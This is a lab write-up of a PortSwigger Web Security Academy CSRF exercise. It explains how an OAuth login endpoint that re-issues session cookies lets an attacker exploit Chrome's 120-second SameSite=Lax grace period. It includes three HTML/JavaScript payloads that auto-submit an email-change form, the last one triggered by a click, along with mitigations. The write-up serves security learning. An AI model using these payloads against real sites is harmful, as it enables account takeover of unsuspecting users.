# Lab10 - SameSite Lax Bypass Via OAuth Cookie Refresh

## Objective

Exploit a CSRF vulnerability by abusing an OAuth login flow to refresh the victim's session cookie and bypass Chrome's SameSite=Lax protections.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | CSRF |
| Difficulty | Practitioner |
| Vulnerability | CSRF |
| Bypass Technique | OAuth Cookie Refresh |
| Platform | PortSwigger Web Security Academy |

---

# Lab Description

The application relies on:

```text
SameSite=Lax
```

for CSRF protection.

The challenge is that Chrome normally blocks cross-site POST requests when SameSite=Lax cookies are involved.

However, Chrome provides a temporary exception for newly issued cookies.

If we can force the application to issue a fresh session cookie immediately before our CSRF attack, the browser will send the cookie with a cross-site POST request.

---

# Core Concept

## Chrome's Lax Grace Period

When a cookie is issued without an explicit SameSite attribute:

```http
Set-Cookie:
session=abc123
```

Chrome applies:

```text
SameSite=Lax
```

automatically.

For approximately:

```text
120 Seconds
```

the browser allows the cookie to be sent during cross-site POST requests.

---

# Attack Flow

```text
Victim Visits Exploit Page
        ↓
OAuth Login Triggered
        ↓
Fresh Session Cookie Issued
        ↓
120 Second Grace Period Starts
        ↓
CSRF Request Submitted
        ↓
Email Changed
```

---

# Analysis

## Step 1 - Inspect Session Cookie

Observed:

```http
Set-Cookie:
session=XYZ
```

No explicit:

```http
SameSite=Lax
```

attribute present.

This suggested:

```text
Chrome Default Lax Behaviour
```

---

## Step 2 - Test Basic CSRF

Generated a normal CSRF PoC.

Result:

```text
Worked Immediately After Login
```

but

```text
Failed After Waiting
```

This strongly suggested:

```text
120 Second Grace Period
```

behavior.

---

## Step 3 - Search For Cookie Refresh Functionality

Application contained:

```text
/social-login
```

endpoint.

---

## Step 4 - Test OAuth Flow

Repeatedly visited:

```text
/social-login
```

and observed:

```text
New Session Cookie
```

being issued every time.

---

# Attack Methodology

```text
Identify OAuth Flow
        ↓
Confirm Session Cookie Refresh
        ↓
Trigger OAuth Login
        ↓
Obtain Fresh Cookie
        ↓
Submit CSRF Request
        ↓
Exploit Successful
```

---

# Exploitation Steps

### Step 1

Generate CSRF PoC using Burp.

---

### Step 2

Identify OAuth endpoint:

```text
/social-login
```

---

### Step 3

Verify:

```text
New Session Cookie
```

issued after OAuth login.

---

### Step 4

Trigger OAuth flow from exploit page.

---

### Step 5

Wait for OAuth process to complete.

---

### Step 6

Automatically submit CSRF form.

---

### Step 7

Deliver exploit to victim.

---

# Full Payload(s) Used

## Payload 1 - Basic CSRF Test

```html
<script>
history.pushState('', '', '/')
</script>

<form action="https://TARGET.web-security-academy.net/my-account/change-email"
      method="POST">

<input type="hidden"
       name="email"
       value="attacker@evil.com" />

</form>

<script>
document.forms[0].submit();
</script>
```

---

### Purpose

Verify whether:

```text
Fresh Session Cookie
```

can bypass SameSite restrictions.

---

### Observation

```text
Worked Shortly After Login
Failed Later
```

which confirmed:

```text
120 Second Grace Period
```

---

## Payload 2 - OAuth Refresh Attempt (Failed)

```html
<form method="POST"
      action="https://TARGET.web-security-academy.net/my-account/change-email">

<input type="hidden"
       name="email"
       value="attacker@evil.com">

</form>

<script>

window.open(
'https://TARGET.web-security-academy.net/social-login'
);

setTimeout(changeEmail,5000);

function changeEmail() {
    document.forms[0].submit();
}

</script>
```

---

### Result

```text
Popup Blocked
```

because:

```text
window.open()
```

was not triggered by user interaction.

---

## Payload 3 - Final Working Payload

```html
<form method="POST"
      action="https://TARGET.web-security-academy.net/my-account/change-email">

<input type="hidden"
       name="email"
       value="attacker@evil.com">

</form>

<p>Click anywhere on the page</p>

<script>

window.onclick = () => {

    window.open(
    'https://TARGET.web-security-academy.net/social-login'
    );

    setTimeout(changeEmail,5000);
}

function changeEmail() {
    document.forms[0].submit();
}

</script>
```

---

# Why The Payload Works

## Stage 1

Victim visits exploit page.

---

## Stage 2

Victim clicks page.

---

## Stage 3

Browser allows:

```javascript
window.open()
```

because it originates from:

```text
User Interaction
```

---

## Stage 4

OAuth login flow executes.

---

## Stage 5

Application issues:

```text
Fresh Session Cookie
```

---

## Stage 6

Chrome activates:

```text
120 Second Grace Period
```

---

## Stage 7

CSRF request executes.

---

## Stage 8

Browser sends:

```text
Authenticated Session Cookie
```

with POST request.

---

## Stage 9

Email successfully changed.

---

# Personal Analysis & Testing Process

## Initial Observation

Normal CSRF attacks seemed inconsistent.

Sometimes they worked.

Sometimes they failed.

---

## First Hypothesis

Possible:

```text
SameSite=Lax
```

protection.

---

## Verification

Repeated tests immediately after login.

Observed:

```text
Success
```

Then waited.

Observed:

```text
Failure
```

---

## Key Realization

Chrome provides:

```text
120 Second Grace Period
```

for newly issued cookies.

---

## New Objective

Need a way to:

```text
Refresh Session Cookie
```

on demand.

---

## OAuth Discovery

Found:

```text
/social-login
```

which re-issued a session cookie.

---

## Failed Attempt

Used:

```javascript
window.open()
```

automatically.

Result:

```text
Popup Blocked
```

---

## Breakthrough

Realized browsers permit popups only after:

```text
User Gesture
```

such as:

```text
Click
```

---

## Final Solution

```text
User Click
        ↓
OAuth Refresh
        ↓
Fresh Cookie
        ↓
CSRF Form Submit
```

---

## Important Revision Note

```text
SameSite=Lax Was Not Broken

Chrome's Temporary Exception
For Newly Issued Cookies
Was Abused.
```

This is an important distinction during interviews and bug bounty hunting.

---

# Tools Used

```text
Burp Suite
Burp Repeater
Burp Proxy
Chrome DevTools
Exploit Server
```

---

# Mitigation

## Use CSRF Tokens

Do not rely solely on:

```text
SameSite=Lax
```

---

## Explicitly Configure SameSite

Use:

```http
SameSite=Lax
```

instead of relying on browser defaults.

---

## Avoid Unnecessary Session Re-Issuance

OAuth flows should not continuously generate new session cookies.

---

## Validate Origin Header

Add server-side request validation.

---

# Related Theory

- `15-bypassing-samesite-lax-restrictions-with-newly-issued-cookies.md`
- `16-csrf-samesite-lax-bypass-via-oauth-cookie-refresh.md`

---

# Related Payloads

- `oauth-cookie-refresh-notes.md`
- `samesite-bypass-techniques.md`

---

# Key Learnings

- Chrome applies a temporary exception to newly issued cookies.
- OAuth flows can unintentionally refresh session cookies.
- Browser popup restrictions can impact exploit reliability.
- SameSite=Lax should never be the primary CSRF defense.
- Authentication workflows should always be analyzed during CSRF testing.

> A secure application should use CSRF tokens, not rely solely on browser cookie policies.